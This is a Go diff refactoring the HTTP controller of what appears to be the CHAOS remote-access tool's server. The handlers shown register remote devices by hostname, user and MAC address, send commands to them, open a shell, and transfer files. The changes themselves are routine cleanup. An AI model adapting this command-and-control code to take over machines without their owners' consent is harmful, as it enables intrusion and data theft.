@@ -9,8 +9,8 @@ import (
 	"github.com/gin-gonic/gin/binding"
 	"github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/entities"
+	"github.com/tiagorlampert/CHAOS/internal"
 	"github.com/tiagorlampert/CHAOS/internal/utils"
-	"github.com/tiagorlampert/CHAOS/internal/utils/constants"
 	"github.com/tiagorlampert/CHAOS/internal/utils/network"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 	"github.com/tiagorlampert/CHAOS/presentation/http/request"
@@ -127,12 +127,12 @@ func (h *httpController) setDeviceHandler(c *gin.Context) {
 	}
 
 	fields := logrus.Fields{
-		`hostname`:   body.Hostname,
-		`username`:   body.UserID,
-		`ipAddress`:  body.LocalIPAddress,
-		`macAddress`: body.MacAddress,
-		`os`:         body.OSName,
-		`arch`:       body.OSArch,
+		"hostname":   body.Hostname,
+		"username":   body.UserID,
+		"ipAddress":  body.LocalIPAddress,
+		"macAddress": body.MacAddress,
+		"os":         body.OSName,
+		"arch":       body.OSArch,
 	}
 
 	if err := h.DeviceService.Insert(body); err != nil {
@@ -141,13 +141,11 @@ func (h *httpController) setDeviceHandler(c *gin.Context) {
 		return
 	}
 
-	h.Logger.WithFields(fields).Info(`Device available`)
 	c.Status(http.StatusOK)
-	return
 }
 
 func (h *httpController) getDevicesHandler(c *gin.Context) {
-	devices, err := h.DeviceService.FindAll()
+	devices, err := h.DeviceService.FindAllConnected()
 	if err != nil {
 		h.Logger.Error(`Failed to get available devices`)
 		c.Status(http.StatusInternalServerError)
@@ -167,14 +165,14 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 		return
 	}
 	if len(strings.TrimSpace(form.Command)) == 0 {
-		c.String(http.StatusOK, constants.NoContent)
+		c.String(http.StatusOK, internal.NoContent)
 		return
 	}
 
 	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
 	defer cancel()
 
-	payload, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
+	output, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
 		MacAddress: form.Address,
 		Request:    form.Command,
 	})
@@ -182,8 +180,7 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 		c.String(http.StatusInternalServerError, err.Error())
 		return
 	}
-	c.String(http.StatusOK, payload.Response)
-	return
+	c.String(http.StatusOK, output.Response)
 }
 
 func (h *httpController) getCommandHandler(c *gin.Context) {
@@ -273,8 +270,8 @@ func (h *httpController) shellHandler(c *gin.Context) {
 
 func (h *httpController) downloadFileHandler(c *gin.Context) {
 	fileName := c.Param("filename")
-	targetPath := filepath.Join(constants.TempDirectory, fileName)
-	if !strings.HasPrefix(filepath.Clean(targetPath), constants.TempDirectory) {
+	targetPath := filepath.Join(internal.TempDirectory, fileName)
+	if !strings.HasPrefix(filepath.Clean(targetPath), internal.TempDirectory) {
 		c.String(403, "Forbidden")
 		return
 	}
@@ -344,7 +341,7 @@ func (h *httpController) uploadFileHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
-	if err := c.SaveUploadedFile(file, fmt.Sprint(constants.TempDirectory, file.Filename)); err != nil {
+	if err := c.SaveUploadedFile(file, fmt.Sprint(internal.TempDirectory, file.Filename)); err != nil {
 		c.String(http.StatusInternalServerError, err.Error())
 		return
 	}
